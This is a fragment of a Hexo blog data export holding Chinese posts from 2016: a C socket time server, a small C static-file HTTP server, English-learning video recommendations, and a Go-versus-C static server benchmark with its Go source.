fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//监听端口，最大并发数10</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"listen()\\n\"</span>);</span><br><span class=\"line\">\tiRet=listen(serverfd,LISTENQ);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(iRet==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"listen() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//接受请求，发送主机时间</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;;)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Waiting for connection...\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//接受请求</span></span><br><span class=\"line\">\t\tconnectfd=accept(serverfd,(<span class=\"keyword\">struct</span> sockaddr*)<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//获取时间 </span></span><br><span class=\"line\">\t\ttlick=time(<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//格式化时间 </span></span><br><span class=\"line\">\t\t<span class=\"built_in\">snprintf</span>(buff,<span class=\"keyword\">sizeof</span>(buff),<span class=\"string\">\"From mys:\\n%s\"</span>,ctime(&amp;tlick));</span><br><span class=\"line\">\t\t<span class=\"comment\">//写入时间</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//关闭请求</span></span><br><span class=\"line\">\t\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t\tsend(connectfd,buff,<span class=\"built_in\">strlen</span>(buff),<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\tclosesocket(connectfd);</span><br><span class=\"line\">\t\t<span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">\t\twrite(connectfd,buff,<span class=\"built_in\">strlen</span>(buff));</span><br><span class=\"line\">\t\tclose(connectfd);</span><br><span class=\"line\">\t\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"comment\">//Winsows下关闭socket</span></span><br><span class=\"line\">\tclosesocket(serverfd);</span><br><span class=\"line\">\tWSACleanup();</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//退出</span></span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>编译:gcc -g -o server server.c -l wsock32</p>\n<p>如果你装了MinGW,你也可以尝试一下。</p>"},{"title":"C windows版开源http服务","date":"2016-04-16T16:00:00.000Z","desc":"mingw socket","_content":"\n## minhttpd\n\n[minihttpd](https://github.com/binyanbin/minihttpd)一个超小型静态资源http服务器,,去掉注释及空行的剩余代码量小于300行。可支持windows和linux gcc编译。\n\n#### 功能及目的\n\n此服务的功能仅支持静态资源上传与下载，如图片,js,html,css等静态资源，以此作为单独静态资源服务器使用,使静态资源与web主服务器分离。这个服务也可以让你更了解http服务器的运作方式及基本原理,也是用纯C开发网络服务的一个示例。\n\n#### windwos MinGW编译:\n``` bash\ngcc -o http http.c -l wsock32\n```\n\n#### 站点搭建\n站点搭建:\n创建站点目录，把http.exe复制到目录下，创建www目录并把网站的所有静态页面copy到目录下。\n启动服务\n``` bash\nhttp 8080\n```\n\n#### 历史\nv0.1.0 第一个版本，支持动词get及html。 [2016-4-17]\nv0.1.1 支持图片(最大为1m),css。[2016-5-4]\n\n[源码查看](https://github.com/binyanbin/minihttpd)\n\n","source":"_posts/c-7.md","raw":"---\ntitle: C windows版开源http服务\ndate: 2016-4-17\ndesc: mingw socket\n---\n\n## minhttpd\n\n[minihttpd](https://github.com/binyanbin/minihttpd)一个超小型静态资源http服务器,,去掉注释及空行的剩余代码量小于300行。可支持windows和linux gcc编译。\n\n#### 功能及目的\n\n此服务的功能仅支持静态资源上传与下载，如图片,js,html,css等静态资源，以此作为单独静态资源服务器使用,使静态资源与web主服务器分离。这个服务也可以让你更了解http服务器的运作方式及基本原理,也是用纯C开发网络服务的一个示例。\n\n#### windwos MinGW编译:\n``` bash\ngcc -o http http.c -l wsock32\n```\n\n#### 站点搭建\n站点搭建:\n创建站点目录，把http.exe复制到目录下，创建www目录并把网站的所有静态页面copy到目录下。\n启动服务\n``` bash\nhttp 8080\n```\n\n#### 历史\nv0.1.0 第一个版本，支持动词get及html。 [2016-4-17]\nv0.1.1 支持图片(最大为1m),css。[2016-5-4]\n\n[源码查看](https://github.com/binyanbin/minihttpd)\n\n","slug":"c-7","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsx0009g2x6n6cyowdl","content":"<h2 id=\"minhttpd\"><a href=\"#minhttpd\" class=\"headerlink\" title=\"minhttpd\"></a>minhttpd</h2><p><a href=\"https://github.com/binyanbin/minihttpd\" target=\"_blank\" rel=\"external\">minihttpd</a>一个超小型静态资源http服务器,,去掉注释及空行的剩余代码量小于300行。可支持windows和linux gcc编译。</p>\n<h4 id=\"功能及目的\"><a href=\"#功能及目的\" class=\"headerlink\" title=\"功能及目的\"></a>功能及目的</h4><p>此服务的功能仅支持静态资源上传与下载，如图片,js,html,css等静态资源，以此作为单独静态资源服务器使用,使静态资源与web主服务器分离。这个服务也可以让你更了解http服务器的运作方式及基本原理,也是用纯C开发网络服务的一个示例。</p>\n<h4 id=\"windwos-MinGW编译\"><a href=\"#windwos-MinGW编译\" class=\"headerlink\" title=\"windwos MinGW编译:\"></a>windwos MinGW编译:</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o http http.c <span class=\"_\">-l</span> wsock32</span><br></pre></td></tr></table></figure>\n<h4 id=\"站点搭建\"><a href=\"#站点搭建\" class=\"headerlink\" title=\"站点搭建\"></a>站点搭建</h4><p>站点搭建:<br>创建站点目录，把http.exe复制到目录下，创建www目录并把网站的所有静态页面copy到目录下。<br>启动服务<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http 8080</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"历史\"><a href=\"#历史\" class=\"headerlink\" title=\"历史\"></a>历史</h4><p>v0.1.0 第一个版本，支持动词get及html。 [2016-4-17]<br>v0.1.1 支持图片(最大为1m),css。[2016-5-4]</p>\n<p><a href=\"https://github.com/binyanbin/minihttpd\" target=\"_blank\" rel=\"external\">源码查看</a></p>\n","excerpt":"","more":"<h2 id=\"minhttpd\"><a href=\"#minhttpd\" class=\"headerlink\" title=\"minhttpd\"></a>minhttpd</h2><p><a href=\"https://github.com/binyanbin/minihttpd\">minihttpd</a>一个超小型静态资源http服务器,,去掉注释及空行的剩余代码量小于300行。可支持windows和linux gcc编译。</p>\n<h4 id=\"功能及目的\"><a href=\"#功能及目的\" class=\"headerlink\" title=\"功能及目的\"></a>功能及目的</h4><p>此服务的功能仅支持静态资源上传与下载，如图片,js,html,css等静态资源，以此作为单独静态资源服务器使用,使静态资源与web主服务器分离。这个服务也可以让你更了解http服务器的运作方式及基本原理,也是用纯C开发网络服务的一个示例。</p>\n<h4 id=\"windwos-MinGW编译\"><a href=\"#windwos-MinGW编译\" class=\"headerlink\" title=\"windwos MinGW编译:\"></a>windwos MinGW编译:</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o http http.c <span class=\"_\">-l</span> wsock32</span><br></pre></td></tr></table></figure>\n<h4 id=\"站点搭建\"><a href=\"#站点搭建\" class=\"headerlink\" title=\"站点搭建\"></a>站点搭建</h4><p>站点搭建:<br>创建站点目录，把http.exe复制到目录下，创建www目录并把网站的所有静态页面copy到目录下。<br>启动服务<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http 8080</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"历史\"><a href=\"#历史\" class=\"headerlink\" title=\"历史\"></a>历史</h4><p>v0.1.0 第一个版本，支持动词get及html。 [2016-4-17]<br>v0.1.1 支持图片(最大为1m),css。[2016-5-4]</p>\n<p><a href=\"https://github.com/binyanbin/minihttpd\">源码查看</a></p>\n"},{"title":"英语入门视频推荐","date":"2016-05-05T16:00:00.000Z","desc":"英语学习","_content":"坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频'Learn English with Jennifer'和'extro English'。\n<!-- more -->\n## Learn English with Jennifer\n![Learn English with Jennifer](/img/english-1.png)\n一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。\n[观看地址](http://video.1speaking.com/view/index335.html)\n\n## extro English\n![extro English](/img/english-2.jpg)\n这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。\n[观看地址](http://video.1speaking.com/view/index418.html)","source":"_posts/english-1.md","raw":"---\ntitle: 英语入门视频推荐\ndate: 2016-5-6\ndesc: 英语学习\n---\n坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频'Learn English with Jennifer'和'extro English'。\n<!-- more -->\n## Learn English with Jennifer\n![Learn English with Jennifer](/img/english-1.png)\n一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。\n[观看地址](http://video.1speaking.com/view/index335.html)\n\n## extro English\n![extro English](/img/english-2.jpg)\n这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。\n[观看地址](http://video.1speaking.com/view/index418.html)","slug":"english-1","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsy000ag2x6cwojl8ui","content":"<p>坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。<br><a id=\"more\"></a></p>\n<h2 id=\"Learn-English-with-Jennifer\"><a href=\"#Learn-English-with-Jennifer\" class=\"headerlink\" title=\"Learn English with Jennifer\"></a>Learn English with Jennifer</h2><p><img src=\"/img/english-1.png\" alt=\"Learn English with Jennifer\"><br>一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。<br><a href=\"http://video.1speaking.com/view/index335.html\" target=\"_blank\" rel=\"external\">观看地址</a></p>\n<h2 id=\"extro-English\"><a href=\"#extro-English\" class=\"headerlink\" title=\"extro English\"></a>extro English</h2><p><img src=\"/img/english-2.jpg\" alt=\"extro English\"><br>这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。<br><a href=\"http://video.1speaking.com/view/index418.html\" target=\"_blank\" rel=\"external\">观看地址</a></p>\n","excerpt":"<p>坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。<br>","more":"</p>\n<h2 id=\"Learn-English-with-Jennifer\"><a href=\"#Learn-English-with-Jennifer\" class=\"headerlink\" title=\"Learn English with Jennifer\"></a>Learn English with Jennifer</h2><p><img src=\"/img/english-1.png\" alt=\"Learn English with Jennifer\"><br>一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。<br><a href=\"http://video.1speaking.com/view/index335.html\">观看地址</a></p>\n<h2 id=\"extro-English\"><a href=\"#extro-English\" class=\"headerlink\" title=\"extro English\"></a>extro English</h2><p><img src=\"/img/english-2.jpg\" alt=\"extro English\"><br>这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。<br><a href=\"http://video.1speaking.com/view/index418.html\">观看地址</a></p>"},{"title":"英语入门视频推荐","date":"2016-05-13T16:00:00.000Z","desc":"英语学习","_content":"坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频'Learn English with Jennifer'和'extro English'。\n<!-- more -->\n## Learn English with Jennifer\n![Learn English with Jennifer](/img/english-1.png)\n一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。\n[观看地址](http://video.1speaking.com/view/index335.html)\n\n## extro English\n![extro English](/img/english-2.jpg)\n这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。\n[观看地址](http://video.1speaking.com/view/index418.html)","source":"_posts/english-2.md","raw":"---\ntitle: 英语入门视频推荐\ndate: 2016-5-14\ndesc: 英语学习\n---\n坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频'Learn English with Jennifer'和'extro English'。\n<!-- more -->\n## Learn English with Jennifer\n![Learn English with Jennifer](/img/english-1.png)\n一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。\n[观看地址](http://video.1speaking.com/view/index335.html)\n\n## extro English\n![extro English](/img/english-2.jpg)\n这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。\n[观看地址](http://video.1speaking.com/view/index418.html)","slug":"english-2","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsz000bg2x6heyofswo","content":"<p>坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。<br><a id=\"more\"></a></p>\n<h2 id=\"Learn-English-with-Jennifer\"><a href=\"#Learn-English-with-Jennifer\" class=\"headerlink\" title=\"Learn English with Jennifer\"></a>Learn English with Jennifer</h2><p><img src=\"/img/english-1.png\" alt=\"Learn English with Jennifer\"><br>一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。<br><a href=\"http://video.1speaking.com/view/index335.html\" target=\"_blank\" rel=\"external\">观看地址</a></p>\n<h2 id=\"extro-English\"><a href=\"#extro-English\" class=\"headerlink\" title=\"extro English\"></a>extro English</h2><p><img src=\"/img/english-2.jpg\" alt=\"extro English\"><br>这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。<br><a href=\"http://video.1speaking.com/view/index418.html\" target=\"_blank\" rel=\"external\">观看地址</a></p>\n","excerpt":"<p>坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。<br>","more":"</p>\n<h2 id=\"Learn-English-with-Jennifer\"><a href=\"#Learn-English-with-Jennifer\" class=\"headerlink\" title=\"Learn English with Jennifer\"></a>Learn English with Jennifer</h2><p><img src=\"/img/english-1.png\" alt=\"Learn English with Jennifer\"><br>一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。<br><a href=\"http://video.1speaking.com/view/index335.html\">观看地址</a></p>\n<h2 id=\"extro-English\"><a href=\"#extro-English\" class=\"headerlink\" title=\"extro English\"></a>extro English</h2><p><img src=\"/img/english-2.jpg\" alt=\"extro English\"><br>这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。<br><a href=\"http://video.1speaking.com/view/index418.html\">观看地址</a></p>"},{"title":"golang是不是后端开发神器","date":"2016-05-07T16:00:00.000Z","desc":"golang","_content":"周末有人介绍golang很合适后端开发，随即把之前C实现的静态资源下载功能(读取服务器上的静态资源文件内容返回给客户端)改成golang实现。然后对比一下效果。\n\n## 实现对比\n同样使用标准库,golang实现代码+注释只需要123行,C实现代码+注释412行，golang代码量只有C的1/3。\n\n## 测试对比\n我使用的是jmeter测试，首先测试c实现的服务,分别用100,200,300线程并发，每线程访问10。测试数据如下:\n![c](/img/go-1.png)\n\n![c](/img/go-2.png)\n\n![c](/img/go-3.png)\nC版实现越测数据越看不下去了，出错率越来越大。接着我测golang实现，我分别用300线程，1000线程和5000线程并发，每线程访问10次。测试数据如下:\n![c](/img/go-4.png)\n\n![c](/img/go-5.png)\n\n![c](/img/go-6.png)\n除了响应时间延长，其它都比较稳定，出错率全为0.难道这是传说中的后端神器，难道老板再也不用担心网站访问人数太多当机了，难道我也转golang开发。\n<!-- more -->\n\n## golang实现\n\n``` go\npackage main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/exec\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nvar realPath string //当前程序运行目录\n\n/*\nwww路由，请求处理 w:response  r:request\n*/\nfunc staticResource(w http.ResponseWriter, r *http.Request) {\n\tfmt.Println(\"url:\" + r.RequestURI)\n\tif r.Method == \"get\" || r.Method == \"GET\" {\n\t\tdisposeGet(w, r)\n\t} else if r.Method == \"post\" || r.Method == \"POST\" {\n\t\tdisposePost(w, r)\n\t} else {\n\t\tw.WriteHeader(501)\n\t\tw.Write([]byte(\"<HTML><HEAD><TITLE>Method Not Implemented</TITLE></HEAD><BODY><P>HTTP request method not supported.</BODY></HTML>\"))\n\t}\n}\n\n/*\n取字串 s:字符串 l:取到多少位\n*/\nfunc substr(s string, l int) string {\n\tif len(s) <= l {\n\t\treturn s\n\t}\n\tss, sl, rl, rs := \"\", 0, 0, []rune(s)\n\tfor _, r := range rs {\n\t\trint := int(r)\n\t\tif rint < 128 {\n\t\t\trl = 1\n\t\t} else {\n\t\t\trl = 2\n\t\t}\n\t\tif sl+rl > l {\n\t\t\tbreak\n\t\t}\n\t\tsl += rl\n\t\tss += string(r)\n\t}\n\treturn ss\n}\n\n/*\nget获取静态资源 w: response r: request\n*/\nfunc disposeGet(w http.ResponseWriter, r *http.Request) {\n\trequest_type := r.URL.Path[strings.LastIndex(r.URL.Path, \".\"):]\n\tswitch request_type { //文件类型判断\n\tcase \".html\":\n\t\tw.Header().Set(\"content-type\", \"text/html\")\n\tcase \".htm\":\n\t\tw.Header().Set(\"content-type\", \"text/html\")\n\tcase \".css\":\n\t\tw.Header().Set(\"content-type\", \"text/css\")\n\tcase \".js\":\n\t\tw.Header().Set(\"content-type\", \"text/javascript\")\n\tcase \".png\":\n\t\tw.Header().Set(\"content-type\", \"image/png\")\n\tcase \".gif\":\n\t\tw.Header().Set(\"content-type\", \"image/gif\")\n\tcase \".jpg\":\n\t\tw.Header().Set(\"content-type\", \"image/jpeg\")\n\tdefault:\n\t}\n\tfin, err := os.Open(realPath + r.URL.Path)\n\tdefer fin.Close()\n\tif err != nil { //未找到静态资源文件\n\t\tif request_type == \".html\" || request_type == \".htm\" { //未找到html文件\n\t\t\tw.WriteHeader(404)\n\t\t\tfmt.Println(\"static resource:\", err)\n\t\t\tw.Write([]byte(\"<HTML><TITLE>Not Found</TITLE><BODY><P>The server could not fulfill.your request be.is unavailable or nonexistent.</BODY></HTML>\"))\n\t\t}\n\t}\n\tfd, _ := ioutil.ReadAll(fin)\n\tw.Write(fd)\n}\n\n/*\npost上传静态资源 w: response r: request\n*/\nfunc disposePost(w http.ResponseWriter, r *http.Request) {\n\t//未实现\n}\n\n/*\n程序入口\n*/\nfunc main() {\n\t//获取程序当前路径\n\tfile, _ := exec.LookPath(os.Args[0])\n\tpath, _ := filepath.Abs(file)\n\t//命令行参数处理\n\targ_num := len(os.Args)\n\tif arg_num == 2 {\n\t\tport := os.Args[1] //第一个参数为端口号\n\t\tfmt.Println(\"http server start port:\" + port)\n\t\t//取前当前目录\n\t\trealPath = substr(path, strings.LastIndex(path, \"\\\\\"))\n\t\tflag.Parse()\n\t\t//请求处理\n\t\thttp.HandleFunc(\"/www/\", staticResource)\n\t\terr := http.ListenAndServe(\":\"+port, nil)\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"服务器出错:\", err)\n\t\t}\n\t} else {\n\t\tfmt.Println(\"参数错误，程序退出\")\n\t}\n}\n\n```\n\n\n","source":"_posts/go-1.md","raw":"---\ntitle: golang是不是后端开发神器\ndate: 2016-5-8\ndesc: golang\n---\n周末有人介绍golang很合适后端开发，随即把之前C实现的静态资源下载功能(读取服务器上的静态资源文件内容返回给客户端)改成golang实现。然后对比一下效果。\n\n## 实现对比\n同样使用标准库,golang实现代码+注释只需要123行,C实现代码+注释412行，golang代码量只有C的1/3。\n\n## 测试对比\n我使用的是jmeter测试，首先测试c实现的服务,分别用100,200,300线程并发，每线程访问10。测试数据如下:\n![c](/img/go-1.png)\n\n![c](/img/go-2.png)\n\n![c](/img/go-3.png)\nC版实现越测数据越看不下去了，出错率越来越大。接着我测golang实现，我分别用300线程，1000线程和5000线程并发，每线程访问10次。测试数据如下:\n![c](/img/go-4.png)\n\n![c](/img/go-5.png)\n\n![c](/img/go-6.png)\n除了响应时间延长，其它都比较稳定，出错率全为0.难道这是传说中的后端神器，难道老板再也不用担心网站访问人数太多当机了，难道我也转golang开发。\n<!-- more -->\n\n## golang实现\n\n``` go\npackage main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/exec\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nvar realPath string //当前程序运行目录\n\n/*\nwww路由，请求处理 w:response  r:request\n*/\nfunc staticResource(w http.ResponseWriter, r *http.Request) {\n\tfmt.Println(\"url:\" + r.RequestURI)\n\tif r.Method == \"get\" || r.Method == \"GET\" {\n\t\tdisposeGet(w, r)\n\t} else if r.Method == \"post\" || r.Method == \"POST\" {\n\t\tdisposePost(w, r)\n\t} else {\n\t\tw.WriteHeader(501)\n\t\tw.Write([]byte(\"<HTML><HEAD><TITLE>Method Not Implemented</TITLE></HEAD><BODY><P>HTTP request method not supported.</BODY></HTML>\"))\n\t}\n}\n\n/*\n取字串 s:字符串 l:取到多少位\n*/\nfunc substr(s string, l int) string {\n\tif len(s) <= l {\n\t\treturn s\n\t}\n\tss, sl, rl, rs := \"\", 0, 0, []rune(s)\n\tfor _, r := range rs {\n\t\trint := int(r)\n\t\tif rint < 128 {\n\t\t\trl = 1\n\t\t} else {\n\t\t\trl = 2\n\t\t}\n\t\tif sl+rl > l {\n\t\t\tbreak\n\t\t}\n\t\tsl += rl\n\t\tss += string(r)\n\t}\n\treturn ss\n}\n\n/*\nget获取静态资源 w: response r: request\n*/\nfunc disposeGet(w http.ResponseWriter, r *http.Request) {\n\trequest_type := r.URL.Path[strings.LastIndex(r.URL.Path, \".\"):]\n\tswitch request_type { //文件类型判断\n\tcase \".html\":\n\t\tw.Header().Set(\"content-type\", \"text/html\")\n\tcase \".htm\":\n\t\tw.Header().Set(\"content-type\", \"text/html\")\n\tcase \".css\":\n\t\tw.Header().Set(\"content-type\", \"text/css\")\n\tcase \".js\":\n\t\tw.Header().Set(\"content-type\", \"text/javascript\")\n\tcase \".png\":\n\t\tw.Header().Set(\"content-type\", \"image/png\")\n\tcase \".gif\":\n\t\tw.Header().Set(\"content-type\", \"image/gif\")\n\tcase \".jpg\":\n\t\tw.Header().Set(\"content-type\", \"image/jpeg\")\n\tdefault:\n\t}\n\tfin, err := os.Open(realPath + r.URL.Path)\n\tdefer fin.Close()\n\tif err != nil { //未找到静态资源文件\n\t\tif request_type == \".html\" || request_type == \".htm\" { //未找到html文件\n\t\t\tw.WriteHeader(404)\n\t\t\tfmt.Println(\"static resource:\", err)\n\t\t\tw.Write([]byte(\"<HTML><TITLE>Not Found</TITLE><BODY><P>The server could not fulfill.your request be.is unavailable or nonexistent.</BODY></HTML>\"))\n\t\t}\n\t}\n\tfd, _ := ioutil.ReadAll(fin)\n\tw.Write(fd)\n}\n\n/*\npost上传静态资源 w: response r: request\n*/\nfunc disposePost(w http.ResponseWriter, r *http.Request) {\n\t//未实现\n}\n\n/*\n程序入口\n*/\nfunc main() {\n\t//获取程序当前路径\n\tfile, _ := exec.LookPath(os.Args[0])\n\tpath, _ := filepath.Abs(file)\n\t//命令行参数处理\n\targ_num := len(os.Args)\n\tif arg_num == 2 {\n\t\tport := os.Args[1] //第一个参数为端口号\n\t\tfmt.Println(\"http server start port:\" + port)\n\t\t//取前当前目录\n\t\trealPath = substr(path, strings.LastIndex(path, \"\\\\\"))\n\t\tflag.Parse()\n\t\t//请求处理\n\t\thttp.HandleFunc(\"/www/\", staticResource)\n\t\terr := http.ListenAndServe(\":\"+port, nil)\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"服务器出错:\", err)\n\t\t}\n\t} else {\n\t\tfmt.Println(\"参数错误，程序退出\")\n\t}\n}\n\n```\n\n\n","slug":"go-1","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llt0000cg2x6o3b85n9f","content":"<p>周末有人介绍golang很合适后端开发，随即把之前C实现的静态资源下载功能(读取服务器上的静态资源文件内容返回给客户端)改成golang实现。然后对比一下效果。</p>\n<h2 id=\"实现对比\"><a href=\"#实现对比\" class=\"headerlink\" title=\"实现对比\"></a>实现对比</h2><p>同样使用标准库,golang实现代码+注释只需要123行,C实现代码+注释412行，golang代码量只有C的1/3。</p>\n<h2 id=\"测试对比\"><a href=\"#测试对比\" class=\"headerlink\" title=\"测试对比\"></a>测试对比</h2><p>我使用的是jmeter测试，首先测试c实现的服务,分别用100,200,300线程并发，每线程访问10。测试数据如下:<br><img src=\"/img/go-1.png\" alt=\"c\"></p>\n<p><img src=\"/img/go-2.png\" alt=\"c\"></p>\n<p><img src=\"/img/go-3.png\" alt=\"c\"><br>C版实现越测数据越看不下去了，出错率越来越大。接着我测golang实现，我分别用300线程，1000线程和5000线程并发，每线程访问10次。测试数据如下:<br><img src=\"/img/go-4.png\" alt=\"c\"></p>\n<p><img src=\"/img/go-5.png\" alt=\"c\"></p>\n<p><img src=\"/img/go-6.png\" alt=\"c\"><br>除了响应时间延长，其它都比较稳定，出错率全为0.难道这是传说中的后端神器，难道老板再也不用担心网站访问人数太多当机了，难道我也转golang开发。<br><a id=\"more\"></a></p>\n<h2 id=\"golang实现\"><a href=\"#golang实现\" class=\"headerlink\" title=\"golang实现\"></a>golang实现</h2><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span 